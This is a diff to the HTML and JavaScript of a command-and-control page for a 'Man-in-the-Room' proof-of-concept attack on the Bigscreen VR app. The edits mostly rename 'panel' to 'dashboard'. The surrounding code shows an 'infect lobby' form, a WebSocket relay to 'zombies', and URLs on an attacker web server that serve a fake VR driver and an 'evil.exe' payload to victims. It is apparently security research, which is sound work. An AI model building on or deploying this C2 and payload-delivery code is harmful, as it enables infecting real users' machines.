@@ -40,7 +40,7 @@ of concept only. The end user of this software agrees to use this software for e
     <div class="collapse navbar-collapse" id="navbarSupportedContent">
         <ul class="navbar-nav mr-auto">
             <li class="nav-item active">
-                <a class="nav-link" href="#">Command &amp; control panel <span class="sr-only">(current)</span></a>
+                <a class="nav-link" href="#">Command &amp; Control Dashboard <span class="sr-only">(current)</span></a>
             </li>
             <li class="nav-item"><span class="navbar-text">|</span></li>
             <li class="nav-item">
@@ -115,11 +115,11 @@ of concept only. The end user of this software agrees to use this software for e
                     </li>
                     <li>
                         Peer connection establishment is currently supported only with participants who are already in the room.
-                        This command &amp; control panel does not initiate the connection but accepts incoming connections.
+                        This command &amp; control dashboard does not initiate the connection but accepts incoming connections.
                         This was sufficient for this proof of concept
                     </li>
                     <li>
-                        Command &amp; control panel currently does not support reconnecting to zombies after page refresh.
+                        Command &amp; control dashboard currently does not support reconnecting to zombies after page refresh.
                         Please restart relay server if you refresh this page.
                     </li>
                 </ul>
@@ -161,7 +161,7 @@ of concept only. The end user of this software agrees to use this software for e
     <div class="row">
         <div class="col-12">
             <h1>Man-in-the-Room Attack <small class="text-muted">Proof of Concept</small></h1>
-            <h2>Command &amp; control panel: Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
+            <h2>Command &amp; Control Dashboard: Bigscreen <small class="text-muted"><a href="https://bigscreenvr.com/">https://bigscreenvr.com/</a></small></h2>
         </div>
         <div class="col-6">
             <form class="form-inline justify-content-center" id="infectLobbyForm">
@@ -265,9 +265,9 @@ of concept only. The end user of this software agrees to use this software for e
 
 //region Configuration
 
-/** URL of WebSocket server which relays communication between Command & control panel and zombies. */
+/** URL of WebSocket server which relays communication between Command & control dashboard and zombies. */
 const relayWebSocketServerUrl = 'ws://172.26.103.128:8081';
-/** URL of static web server which hosts this Command & control panel */
+/** URL of static web server which hosts this Command & control dashboard */
 const webServerUrl = 'http://172.26.103.128:8080/';
 const fakeDriverUrl = webServerUrl + 'payloads/VR_driver_0.34.0.exe';
 const evilPayloadUrl = webServerUrl + 'payloads/evil.exe';
@@ -324,7 +324,7 @@ function removePayloadFromName(name){
 
 var messageRelayWs = new WebSocket(relayWebSocketServerUrl);
 messageRelayWs.onopen = function(){
-    messageRelayWs.send(JSON.stringify({type:'control-panel-connect'}));
+    messageRelayWs.send(JSON.stringify({type:'dashboard-register'}));
 };
 messageRelayWs.onmessage = function(event){
     let message = JSON.parse(event.data);
